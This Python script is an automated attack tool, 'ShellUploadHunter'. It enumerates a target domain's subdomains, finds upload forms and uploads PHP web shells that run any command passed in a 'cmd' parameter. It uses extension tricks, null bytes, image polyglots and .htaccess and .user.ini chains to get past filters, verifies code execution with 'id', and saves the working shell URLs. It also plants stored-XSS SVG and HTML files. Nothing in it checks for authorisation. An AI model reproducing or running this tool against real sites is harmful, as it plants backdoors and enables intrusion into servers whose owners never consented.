#!/usr/bin/env python3
"""
ShellUploadHunter v5  -  strict, execution-proven upload RCE finder

    python3 script.py target.com -o shells.txt

Every URL written to -o is re-proven at the end with fresh random
arithmetic + `id`, so a stored file, a soft-404 page, or a reflected
query string can never be reported as a shell.

pip install requests
"""

import argparse
import base64
import concurrent.futures as cf
import json
import os
import random
import re
import socket
import string
import sys
import threading
import time
from datetime import datetime
from urllib.parse import urljoin, urlparse, quote

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("[!] pip install requests")

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
MARKER = "mk" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


# =====================================================================
class Cfg:
    timeout = 12
    tls_verify = False
    threads = 10
    delay = 0.0
    headers = {}
    proxy = None
    depth = 1
    max_pages = 6
    blind = False
    lenient = False
    retries = 2


class Limiter:
    _lock = threading.Lock()
    _last = 0.0

    @classmethod
    def wait(cls):
        if Cfg.delay <= 0:
            return
        with cls._lock:
            gap = cls._last + Cfg.delay - time.time()
            if gap > 0:
                time.sleep(gap)
            cls._last = time.time()


def make_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "*/*",
                      "Accept-Language": "en-US,en;q=0.9"})
    s.headers.update(Cfg.headers)
    if Cfg.proxy:
        s.proxies = {"http": Cfg.proxy, "https": Cfg.proxy}
    retry = Retry(total=Cfg.retries, backoff_factor=0.4,
                  status_forcelist=(429, 500, 502, 503, 504),
                  allowed_methods=frozenset(["GET", "POST", "HEAD"]))
    ad = HTTPAdapter(max_retries=retry, pool_connections=30, pool_maxsize=30)
    s.mount("http://", ad)
    s.mount("https://", ad)
    return s


def _req(s, method, url, **kw):
    Limiter.wait()
    kw.setdefault("timeout", Cfg.timeout)
    kw.setdefault("verify", Cfg.tls_verify)
    kw.setdefault("allow_redirects", True)
    try:
        return s.request(method, url, **kw)
    except requests.RequestException:
        return None


def get(s, url, **kw):
    return _req(s, "GET", url, **kw)


def post(s, url, **kw):
    return _req(s, "POST", url, **kw)


# =====================================================================
#  SUBDOMAINS
# =====================================================================
BUILTIN_WORDS = """
www mail ftp admin portal dev development staging stage test testing qa uat
prod production api api1 api2 app apps blog shop store cdn static img images
image media assets upload uploads files file data download docs wiki help
support status dashboard panel cpanel webmail owa exchange autodiscover smtp
ns1 ns2 dns vpn remote rdp ssh git gitlab jenkins ci build jira confluence
sonar nexus docker registry k8s grafana kibana elastic monitor monitoring
backup backups bak old legacy archive temp tmp beta alpha demo sandbox lab
intranet internal extranet hr erp crm sso auth login oauth idm ldap sql db
mysql mongo redis cache proxy lb gateway firewall ws websocket rpc graphql
rest v1 v2 v3 mobile m web wap partner partners vendor client customer pay
payment checkout cart news forum community cms wp wordpress drupal joomla
attachment avatar profile user users account settings upload2
""".split()

CRTSH = "https://crt.sh/?q=%25.{d}&output=json"
HACKERTARGET = "https://api.hackertarget.com/hostsearch/?q={d}"
RAPIDDNS = "https://rapiddns.io/subdomain/{d}?full=1"
OTX = "https://otx.alienvault.com/api/v1/indicators/domain/{d}/passive_dns"


def _extract(text, domain):
    out = set()
    for m in re.finditer(r"([A-Za-z0-9_*.\-]+\.%s)" % re.escape(domain), text or ""):
        h = m.group(1).lower().lstrip("*.").strip(".")
        if h.endswith(domain):
            out.add(h)
    return out


def passive_enum(domain):
    s = make_session()
    subs = set()
    r = get(s, CRTSH.format(d=domain))
    if r and r.status_code == 200:
        try:
            for e in r.json():
                for line in (e.get("name_value") or "").splitlines():
                    line = line.strip().lower().lstrip("*.")
                    if line.endswith(domain):
                        subs.add(line)
        except ValueError:
            pass
    for url in (HACKERTARGET.format(d=domain), RAPIDDNS.format(d=domain)):
        r = get(s, url)
        if r and r.status_code == 200:
            subs |= _extract(r.text, domain)
    r = get(s, OTX.format(d=domain))
    if r and r.status_code == 200:
        try:
            for e in r.json().get("passive_dns", []):
                h = (e.get("hostname") or "").lower()
                if h.endswith(domain):
                    subs.add(h)
        except ValueError:
            pass
    return subs


def external_tool(tool, domain):
    import shutil, subprocess
    p = shutil.which(tool)
    if not p:
        return set()
    cmd = ([p, "-d", domain, "-silent"] if tool == "subfinder"
           else [p, "enum", "-passive", "-d", domain, "-silent"])
    try:
        return _extract(subprocess.run(cmd, capture_output=True, text=True,
                                       timeout=900).stdout, domain)
    except Exception:
        return set()


def wildcard_ips(domain):
    ips = set()
    for _ in range(2):
        rnd = "zz" + "".join(random.choices(string.ascii_lowercase, k=12))
        try:
            ips.add(socket.gethostbyname(f"{rnd}.{domain}"))
        except socket.gaierror:
            pass
    return ips


def dns_brute(domain, words, wildcard):
    def probe(w):
        h = f"{w}.{domain}"
        try:
            ip = socket.gethostbyname(h)
        except socket.gaierror:
            return None
        return None if (wildcard and ip in wildcard) else h

    out = set()
    with cf.ThreadPoolExecutor(max_workers=50) as ex:
        for r in ex.map(probe, words):
            if r:
                out.add(r)
    return out


def enumerate_subs(domain, words=None, passive=True, brute=True, tools=True):
    subs = set()
    if tools:
        for t in ("subfinder", "amass"):
            got = external_tool(t, domain)
            if got:
                print(f"[*] {t}: {len(got)}")
                subs |= got
    if passive:
        p = passive_enum(domain)
        print(f"[*] passive: {len(p)}")
        subs |= p
    if brute:
        wl = words or BUILTIN_WORDS
        wc = wildcard_ips(domain)
        if wc:
            print(f"[*] wildcard DNS: {','.join(sorted(wc))} (filtered)")
        b = dns_brute(domain, wl, wc)
        print(f"[*] dns brute ({len(wl)}): {len(b)} new")
        subs |= b
    subs.add(domain)
    return sorted(s for s in subs if s == domain or s.endswith("." + domain))


def is_live(host):
    for scheme in ("https", "http"):
        s = make_session()
        r = get(s, f"{scheme}://{host}/")
        if r is not None and r.status_code < 500:
            p = urlparse(r.url)
            return f"{p.scheme}://{p.netloc}/"
    return None


# =====================================================================
#  PAYLOADS  (unique filename per run -> no stale-file false positives)
# =====================================================================
RID = "".join(random.choices(string.ascii_lowercase, k=5))


def _php(m):
    # marker echo + math echo + command exec, all through one param
    return ('<?php '
            f'echo "{m}"; '
            'if(isset($_REQUEST["cmd"])){$c=$_REQUEST["cmd"];echo "##";system($c);echo "##";} '
            '?>').encode()


def _png():
    return (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
            b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01"
            b"\x00\x00\x05\x00\x01\r\n-\xb4\xcc\x00\x00\x00\x00IEND\xaeB`\x82")


def _gif():
    return (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04"
            b"\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")


def _jpg():
    return (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
            b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c"
            b"\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c"
            b"\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\xff\xda\x00\x08\x01\x01"
            b"\x00\x00?\x00\xd2\xcf \xff\xd9")


def _svg(m):
    return (f'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" '
            f'width="120" height="40"><text x="5" y="25">{m}</text>'
            f'<script>alert("{m}")</script></svg>').encode()


def _html(m):
    return (f'<!DOCTYPE html><html><head><title>{m}</title></head><body>'
            f'<h1>{m}</h1><script>alert("{m}")</script></body></html>').encode()


def payloads(m):
    p = _php(m)
    png, gif, jpg = _png() + b"\n" + p, _gif() + b"\n" + p, _jpg() + b"\n" + p
    n = lambda s: f"{RID}{s}"   # noqa: E731  unique base name
    return [
        (n(".php"),        p,     "php"),
        (n(".PHP"),        p,     "php"),
        (n(".php5"),       p,     "php"),
        (n(".php7"),       p,     "php"),
        (n(".phtml"),      p,     "php"),
        (n(".pht"),        p,     "php"),
        (n(".phar"),       p,     "php"),
        (n(".shtml"),      p,     "php"),
        (n(".php.png"),    png,   "php"),
        (n(".png.php"),    png,   "php"),
        (n(".jpg.php"),    jpg,   "php"),
        (n(".gif.php"),    gif,   "php"),
        (n(".php.jpg"),    png,   "php"),
        (n(".php%00.png"), p,     "php"),
        (n(".php."),       p,     "php"),
        (n(".php "),       p,     "php"),
        (n(".php::$DATA"), p,     "php"),
        (n(".php:.png"),   p,     "php"),
        (n(".php;.png"),   p,     "php"),
        (n(".ppng"),       png,   "php"),
        (n(".png"),        png,   "poly"),
        (n(".gif"),        gif,   "poly"),
        (n(".jpg"),        jpg,   "poly"),
        (".htaccess", b"AddType application/x-httpd-php .png .gif .jpg .svg .txt\n"
                      b"AddHandler application/x-httpd-php .png .gif .jpg\n", "htaccess"),
        (".user.ini",  None, "userini"),          # built after png name is known
        (n(".svg"),        _svg(m), "svg"),
        (n(".html"),       _html(m), "html"),
    ]


CT = {".php": "image/png", ".php5": "image/png", ".php7": "image/png",
      ".phtml": "image/png", ".pht": "image/png", ".phar": "image/png",
      ".shtml": "image/png", ".png": "image/png", ".gif": "image/gif",
      ".jpg": "image/jpeg", ".svg": "image/svg+xml", ".html": "text/html",
      ".htm": "text/html", ".htaccess": "text/plain", ".ini": "text/plain"}


def ct_for(name):
    low = name.lower().replace("%00", "")
    for ext in (".htaccess", ".user.ini", ".phtml", ".phar", ".php5", ".php7",
                ".shtml", ".php", ".png", ".gif", ".jpg", ".svg", ".html",
                ".htm", ".ini"):
        if low.endswith(ext):
            return CT[ext]
    return "application/octet-stream"


FALLBACK_FIELDS = ["file", "upload", "image", "userfile", "Filedata",
                   "filedata", "photo", "avatar", "attachment", "img"]


# =====================================================================
#  ENDPOINT DISCOVERY
# =====================================================================
FORM_RE = re.compile(rb"<form\b.*?</form>", re.I | re.S)
INPUT_RE = re.compile(rb"<input\b[^>]*>", re.I)
ENCTYPE_RE = re.compile(rb'enctype\s*=\s*["\']multipart/form-data["\']', re.I)
ACTION_RE = re.compile(rb'action\s*=\s*["\']([^"\']*)["\']', re.I)
NAME_RE = re.compile(rb'name\s*=\s*["\']([^"\']+)["\']', re.I)
VALUE_RE = re.compile(rb'value\s*=\s*["\']([^"\']*)["\']', re.I)
TYPE_RE = re.compile(rb'type\s*=\s*["\']([^"\']+)["\']', re.I)
HREF_RE = re.compile(r'href\s*=\s*["\']([^"\'#]+)["\']', re.I)
JS_RE = re.compile(r'''["'`](/?[A-Za-z0-9_\-./?=&%]*(?:upload|attach|file|image|'''
                   r'''media|avatar|import|editor|ckeditor|dropzone)[A-Za-z0-9_\-./?=&%]*)["'`]''',
                   re.I)

GUESS_PATHS = [
    "upload", "upload.php", "uploads", "upload/", "file-upload", "fileupload",
    "files", "media/upload", "admin/upload", "dashboard/upload",
    "profile/avatar", "user/avatar", "settings/avatar", "avatar/upload",
    "image/upload", "editor/upload", "attachments", "api/upload",
    "api/v1/upload", "api/files", "api/media", "api/attachments",
    "index.php?page=upload", "wp-admin/media-new.php", "wp-admin/async-upload.php",
    "administrator/index.php?option=com_media", "elfinder/php/connector.minimal.php",
    "php/upload.php", "includes/upload.php",
]

KEYWORD_RE = re.compile(r"(upload|multipart|filename|attachment)", re.I)
UPLOAD_DIRS = ["", "uploads/", "upload/", "files/", "file/", "images/", "img/",
               "media/", "assets/uploads/", "assets/files/", "data/", "tmp/",
               "static/uploads/", "wp-content/uploads/", "public/uploads/",
               "storage/uploads/", "userfiles/", "attachments/"]


def parse_forms(sess, url):
    out = []
    r = get(sess, url)
    if not r or r.status_code >= 500:
        return out
    for form in FORM_RE.findall(r.content):
        if not ENCTYPE_RE.search(form):
            continue
        field, extras = None, {}
        for tag in INPUT_RE.findall(form):
            tm = TYPE_RE.search(tag)
            t = tm.group(1).decode().lower() if tm else "text"
            nm = NAME_RE.search(tag)
            if not nm:
                continue
            name = nm.group(1).decode(errors="replace")
            vm = VALUE_RE.search(tag)
            if t == "file":
                field = name
            elif t in ("hidden", "text", "submit"):
                extras[name] = vm.group(1).decode(errors="replace") if vm else ""
        if not field:
            continue
        am = ACTION_RE.search(form)
        action = am.group(1).decode(errors="replace") if am else ""
        target = action if action.startswith("http") else urljoin(r.url, action or r.url)
        if urlparse(target).netloc != urlparse(url).netloc:
            continue
        out.append({"action": target, "field": field, "extras": extras,
                    "guessed": False})
    return out


def crawl(sess, base):
    seen, pages, queue = {base}, [base], [base]
    for _ in range(Cfg.depth):
        nxt = []
        for page in queue[:Cfg.max_pages]:
            r = get(sess, page)
            if not r:
                continue
            for link in HREF_RE.findall(r.text or ""):
                full = urljoin(page, link)
                p = urlparse(full)
                if (p.netloc == urlparse(base).netloc and full not in seen
                        and not re.search(r"\.(png|jpe?g|gif|css|js|ico|svg|woff2?|"
                                          r"ttf|pdf|zip)(\?|$)", full, re.I)):
                    seen.add(full)
                    nxt.append(full)
                    if len(pages) < Cfg.max_pages:
                        pages.append(full)
        queue = nxt
    return pages


def discover(sess, base):
    eps = {}

    def add(url, field, extras, guessed=False):
        k = (url.split("#")[0], field)
        if k not in eps:
            eps[k] = {"action": k[0], "field": field,
                      "extras": extras or {}, "guessed": guessed}

    for page in crawl(sess, base):
        for f in parse_forms(sess, page):
            add(f["action"], f["field"], f["extras"])
        r = get(sess, page)
        if r:
            for m in JS_RE.findall(r.text or ""):
                full = urljoin(page, m.strip())
                if urlparse(full).netloc == urlparse(base).netloc:
                    add(full, "file", {}, True)

    for path in GUESS_PATHS:
        url = urljoin(base, path)
        r = get(sess, url)
        if r is None:
            continue
        if r.status_code < 400:
            forms = parse_forms(sess, url)
            if forms:
                for f in forms:
                    add(f["action"], f["field"], f["extras"])
            elif KEYWORD_RE.search(r.text or ""):
                add(url, "file", {}, True)
        elif Cfg.blind and r.status_code in (401, 403, 405, 415):
            add(url, "file", {}, True)
    return list(eps.values())


# =====================================================================
#  STRICT VERIFICATION
# =====================================================================
def rnd6():
    return random.randint(100000, 999999)


def _soft404(sess, ep):
    """Some servers answer 200 for every path -> baseline to compare against."""
    base_dir = ep["action"] if ep["action"].endswith("/") \
        else ep["action"].rsplit("/", 1)[0] + "/"
    junk = "zz" + "".join(random.choices(string.ascii_lowercase, k=10)) + ".php"
    r = get(sess, urljoin(base_dir, junk))
    if r and r.status_code == 200:
        return (r.status_code, len(r.content))
    return None


def prove(sess, url, payload=None, baseline=None):
    """
    Returns (user_string, reason). user_string truthy == PROVEN RCE.
    Proof chain:
      1. HTTP 200, no redirect away from the file
      2. body is not the raw uploaded file (not static hosting)
      3. no PHP source leak
      4. two different random products are computed by the server
      5. `id` returns a real uid
    """
    r = get(sess, url)
    if r is None:
        return None, "unreachable"
    if r.status_code != 200:
        return None, f"http-{r.status_code}"
    if urlparse(r.url).path.rstrip("/") != urlparse(url).path.rstrip("/"):
        return None, "redirected-away"
    body = r.content or b""
    if baseline and len(body) == baseline[1]:
        return None, "soft-404"
    if payload and body.strip() == payload.strip():
        return None, "served-raw"
    if b"<?php" in body and MARKER.encode() not in body:
        return None, "source-leak"

    sep = "&" if "?" in url else "?"
    for _ in range(2):
        a, b = rnd6(), rnd6()
        want = str(a * b)
        cmd = quote(f"echo $(({a}*{b}))")
        rr = get(sess, f"{url}{sep}cmd={cmd}")
        if rr is None or rr.status_code != 200:
            return None, "exec-unreachable"
        if want not in (rr.text or ""):
            return None, "exec-no-output"
    r3 = get(sess, f"{url}{sep}cmd=id")
    m = re.search(r"uid=\d+\([^)]*\)", (r3.text if r3 else "") or "")
    if not m:
        return None, "no-uid"
    return m.group(0), "ok"


def returned_path(resp, name):
    if resp is None:
        return None
    stem = os.path.basename(name.replace("%00", "")).split(".")[0].lower()
    body = resp.text or ""
    for c in re.findall(r'(?:src|href|url|path|file|location|link)\s*[:=]?\s*["\']?'
                        r'([^"\'<>\s,}]{4,200})', body, re.I):
        if stem in c.lower():
            return c
    m = re.search(r"([\w\-./%]*%s[\w\-./%]*)" % re.escape(stem), body, re.I)
    return m.group(1) if m else None


def upload(sess, ep, name, content, field=None):
    data = dict(ep["extras"])
    data.setdefault("submit", "Upload")
    data.setdefault("MAX_FILE_SIZE", "10000000")
    r = post(sess, ep["action"],
             files={(field or ep["field"]): (name, content, ct_for(name))},
             data=data,
             headers={"Referer": ep["action"], "X-Requested-With": "XMLHttpRequest"})
    return r if (r is not None and r.status_code < 500) else None


def locate(sess, ep, name, resp, content, baseline):
    base_dir = ep["action"] if ep["action"].endswith("/") \
        else ep["action"].rsplit("/", 1)[0] + "/"
    sig = content[:8]
    cands = []
    rp = returned_path(resp, name)
    if rp:
        cands.append(urljoin(ep["action"], rp))
    cands += [urljoin(base_dir, d + name) for d in UPLOAD_DIRS]
    for c in cands:
        r = get(sess, c)
        if r is None or r.status_code != 200:
            continue
        if baseline and len(r.content) == baseline[1] and sig not in r.content:
            continue                      # soft-404 page, not our file
        if sig in r.content or MARKER.encode() in r.content:
            return c
    return None


# =====================================================================
#  ATTACK
# =====================================================================
def attack(base, results, lock):
    sess = make_session()
    eps = discover(sess, base)
    if not eps:
        print(f"    [-] {base}: no upload endpoint")
        return
    print(f"    [*] {base}: {len(eps)} endpoint(s)")

    for ep in eps:
        baseline = _soft404(sess, ep)
        fields = [ep["field"]]
        if ep["guessed"]:
            fields += [f for f in FALLBACK_FIELDS if f != ep["field"]]
        solved = False

        for field in fields:
            if solved:
                break
            for name, content, kind in payloads(MARKER):
                tag = f"{ep['action']} [{field}]"

                # ---- .user.ini needs the png name first
                if kind == "userini":
                    png_name = RID + ".png"
                    ini = f"auto_prepend_file={png_name}\nallow_url_include=On\n".encode()
                    if upload(sess, ep, ".user.ini", ini, field) is None:
                        continue
                    png = _png() + b"\n" + _php(MARKER)
                    ri = upload(sess, ep, png_name, png, field)
                    if ri is None:
                        continue
                    iu = locate(sess, ep, png_name, ri, png, baseline)
                    if not iu:
                        continue
                    for probe in (urljoin(iu.rsplit("/", 1)[0] + "/", "index.php"),
                                  iu.rsplit("/", 1)[0] + "/"):
                        who, why = prove(sess, probe, None, baseline)
                        if who:
                            with lock:
                                results.append({"type": "rce", "url": probe,
                                                "via": ".user.ini+png", "who": who,
                                                "endpoint": tag, "host": base,
                                                "_payload": png})
                            print(f"      [RCE] {probe}  <- .user.ini chain @ {tag} [{who}]")
                            solved = True
                            break
                    break

                # ---- server config abuse
                if kind == "htaccess":
                    if upload(sess, ep, ".htaccess", content, field) is None:
                        continue
                    png_name = RID + ".png"
                    png = _png() + b"\n" + _php(MARKER)
                    ri = upload(sess, ep, png_name, png, field)
                    if ri is None:
                        continue
                    iu = locate(sess, ep, png_name, ri, png, baseline)
                    if not iu:
                        continue
                    who, why = prove(sess, iu, png, baseline)
                    if who:
                        with lock:
                            results.append({"type": "rce", "url": iu,
                                            "via": ".htaccess+png", "who": who,
                                            "endpoint": tag, "host": base,
                                            "_payload": png})
                        print(f"      [RCE] {iu}  <- .htaccess chain @ {tag} [{who}]")
                        solved = True
                        break
                    continue

                # ---- client-side content
                if kind in ("svg", "html"):
                    r = upload(sess, ep, name, content, field)
                    if r is None:
                        continue
                    u = locate(sess, ep, name, r, content, baseline)
                    if u:
                        rr = get(sess, u)
                        if rr and rr.status_code == 200 and MARKER in (rr.text or ""):
                            with lock:
                                results.append({"type": "stored-xss", "url": u,
                                                "via": name, "who": "",
                                                "endpoint": tag, "host": base,
                                                "_payload": content})
                            print(f"      [STORED-XSS] {u} <- {name}")
                    continue

                # ---- php candidates
                r = upload(sess, ep, name, content, field)
                if r is None:
                    continue
                u = locate(sess, ep, name, r, content, baseline)
                if not u:
                    continue
                who, why = prove(sess, u, content, baseline)
                if who:
                    with lock:
                        results.append({"type": "rce", "url": u, "via": name,
                                        "who": who, "endpoint": tag, "host": base,
                                        "_payload": content})
                    print(f"      [RCE] {u}  <- {name} @ {tag} [{who}]")
                    solved = True
                    break
                if why in ("served-raw", "no-marker") and Cfg.lenient:
                    with lock:
                        results.append({"type": "polyglot-stored", "url": u,
                                        "via": name, "who": "",
                                        "endpoint": tag, "host": base,
                                        "_payload": content})
                    print(f"      [POLYGLOT] {u} <- {name} ({why})")


# =====================================================================
#  MAIN
# =====================================================================
def normalize(t):
    t = t.strip().lower().replace("http://", "").replace("https://", "")
    return t.split("/")[0].split("?")[0]


def main():
    ap = argparse.ArgumentParser(
        usage="%(prog)s target.com -o shells.txt",
        description="Auto subdomain crawl + upload RCE hunter (strict proof)")
    ap.add_argument("target", help="domain or URL")
    ap.add_argument("-o", "--output", default="shells.txt",
                    help="file for verified shell URLs (default shells.txt)")
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("-s", "--subs", help="pre-made subdomain list")
    ap.add_argument("--subs-only", action="store_true")
    ap.add_argument("--no-passive", action="store_true")
    ap.add_argument("--no-brute", action="store_true")
    ap.add_argument("--no-tools", action="store_true")
    ap.add_argument("-c", "--threads", type=int, default=10)
    ap.add_argument("-t", "--timeout", type=int, default=12)
    ap.add_argument("--delay", type=float, default=0.0)
    ap.add_argument("--depth", type=int, default=1)
    ap.add_argument("--max-pages", type=int, default=6)
    ap.add_argument("-H", "--header", action="append", default=[])
    ap.add_argument("--proxy")
    ap.add_argument("-k", "--insecure", action="store_true", default=True)
    ap.add_argument("--blind", action="store_true")
    ap.add_argument("--lenient", action="store_true",
                    help="also list stored-but-not-executing polyglots")
    ap.add_argument("--append", action="store_true")
    ap.add_argument("--json", action="store_true", help="also write JSON report")
    args = ap.parse_args()

    Cfg.timeout, Cfg.threads, Cfg.delay = args.timeout, args.threads, args.delay
    Cfg.depth, Cfg.max_pages = args.depth, args.max_pages
    Cfg.proxy, Cfg.blind = args.proxy, args.blind
    Cfg.tls_verify, Cfg.lenient = not args.insecure, args.lenient
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            Cfg.headers[k.strip()] = v.strip()

    domain = normalize(args.target)
    t0 = time.time()
    print(f"[*] target={domain}  marker={MARKER}  run={RID}")

    subs = set()
    if args.subs:
        with open(args.subs) as f:
            for line in f:
                h = normalize(line) if line.strip() else ""
                if h and not h.startswith("#") and h.endswith(domain):
                    subs.add(h)
        print(f"[*] from {args.subs}: {len(subs)}")
    words = None
    if args.wordlist:
        with open(args.wordlist) as f:
            words = [l.strip() for l in f if l.strip() and not l.startswith("#")]

    subs |= set(enumerate_subs(domain, words,
                               passive=not args.no_passive,
                               brute=not args.no_brute,
                               tools=not args.no_tools))
    hosts = sorted(subs)
    print(f"[*] subdomains: {len(hosts)}")

    if args.subs_only:
        p = args.output if args.output.endswith(".txt") else args.output + "_subdomains.txt"
        with open(p, "w") as f:
            f.write("\n".join(hosts) + "\n")
        print(f"[+] {p}")
        return

    print("[*] liveness ...")
    live = []
    with cf.ThreadPoolExecutor(max_workers=args.threads) as ex:
        for b in ex.map(is_live, hosts):
            if b:
                live.append(b)
    live = sorted(set(live))
    print(f"[*] live: {len(live)}")
    for u in live:
        print(f"    [live] {u}")

    print("[*] crawling + hunting ...")
    results, lock = [], threading.Lock()
    with cf.ThreadPoolExecutor(max_workers=max(1, args.threads // 2)) as ex:
        list(ex.map(lambda b: attack(b, results, lock), live))

    # ---------- FINAL RE-PROOF PASS -------------------------------
    rce = [r for r in results if r["type"] == "rce"]
    print(f"\n[*] re-proving {len(rce)} candidate shell(s) ...")
    verified = []
    for r in rce:
        s = make_session()
        ep = {"action": r["endpoint"].split(" [")[0], "field": "file",
              "extras": {}, "guessed": False}
        who, why = prove(s, r["url"], r.get("_payload"), _soft404(s, ep))
        if who:
            r["who"] = who
            verified.append(r)
            print(f"    [OK] {r['url']}  [{who}]")
        else:
            print(f"    [DROP] {r['url']}  ({why})")
    others = [r for r in results if r["type"] != "rce"]

    # ---------- REPORT --------------------------------------------
    verified.sort(key=lambda r: r["url"])
    mode = "a" if args.append else "w"
    with open(args.output, mode) as f:
        for r in verified:
            f.write(r["url"] + "\n")

    detail = os.path.splitext(args.output)[0] + "_details.txt"
    with open(detail, mode) as f:
        f.write(f"# target={domain}  {datetime.now():%Y-%m-%d %H:%M:%S}\n")
        f.write(f"# marker={MARKER}  marker-run={RID}  live={len(live)}\n\n")
        f.write("[PROVEN SHELLS]\n")
        for r in verified:
            f.write(f"{r['url']}\n    via {r['via']}  @ {r['endpoint']}  [{r['who']}]\n")
        if others:
            f.write("\n[OTHER]\n")
            for r in others:
                f.write(f"{r['type']}\t{r['url']}\tvia {r['via']} @ {r['endpoint']}\n")

    if args.json:
        js = os.path.splitext(args.output)[0] + ".json"
        with open(js, "w") as f:
            json.dump({"domain": domain, "generated": datetime.now().isoformat(),
                       "elapsed": round(time.time() - t0, 1),
                       "live_hosts": live,
                       "shells": [{k: v for k, v in r.items() if not k.startswith("_")}
                                  for r in verified],
                       "other": [{k: v for k, v in r.items() if not k.startswith("_")}
                                 for r in others]}, f, indent=2)
        print(f"[+] json   -> {js}")

    print("\n" + "=" * 70)
    print(f"PROVEN SHELLS: {len(verified)}    (other: {len(others)})")
    print("=" * 70)
    for r in verified:
        print(f"[SHELL] {r['url']}   <- {r['via']}   [{r['who']}]")
    for r in others:
        print(f"[{r['type']}] {r['url']}")
    print(f"\n[+] shells -> {args.output}")
    print(f"[+] detail -> {detail}")
    print(f"[*] elapsed {round(time.time()-t0,1)}s")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted")
